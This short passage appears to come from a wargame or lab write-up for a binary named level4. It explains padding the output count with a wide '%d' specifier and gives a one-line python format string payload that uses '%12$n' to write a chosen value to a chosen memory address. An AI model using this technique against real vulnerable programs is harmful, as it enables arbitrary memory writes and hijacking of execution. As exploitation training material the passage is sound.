The previous method will be too long

There is a trick with the modifier "%d", "%XXXd" will get an XXX size int

We can generate our number of bytes like that

$ python -c 'print "\x10\x98\x04\x08"+"%16930112d%12$n"' | ./level4